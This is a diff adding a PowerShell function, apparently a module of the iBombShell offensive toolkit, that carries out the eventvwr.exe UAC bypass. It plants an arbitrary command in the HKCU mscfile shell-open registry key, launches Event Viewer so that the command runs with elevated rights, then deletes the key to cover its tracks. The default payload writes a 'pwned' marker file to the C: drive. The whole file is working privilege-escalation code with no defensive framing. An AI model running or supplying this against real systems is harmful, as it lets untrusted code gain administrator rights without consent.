@@ -1,0 +1,30 @@
+function invoke-eventvwr{
+  param(
+    [String] $instruction,
+    [Switch] $noDefault
+  )
+  
+  $path = 'hkcu:\software\classes\mscfile\shell\open\command'
+
+  #check if exist hkcu:\software\classes\mscfile\shell\open\command
+  if(-not(Test-Path -Path $path))
+  {
+    printMessage -message "Path doesn't exist"
+    printMessage -message "Creating path"
+    mkdir -Force hkcu:\software\classes\mscfile\shell\open\command
+  }
+
+  if($noDefault)
+  {
+    New-ItemProperty -Name '(Default)' -Value $instruction -Path $path
+  }
+  else
+  {
+    New-ItemProperty -Name '(Default)' -Value "c:\windows\system32\windowspowershell\v1.0\powershell.exe -C echo pwned > c:\iBombShell.txt" -Path $path
+  }
+
+  Start-Process C:\windows\System32\eventvwr.exe 
+  sleep 1 
+  rm -Force -Recurse 'hkcu:\software\classes\mscfile'
+  
+}
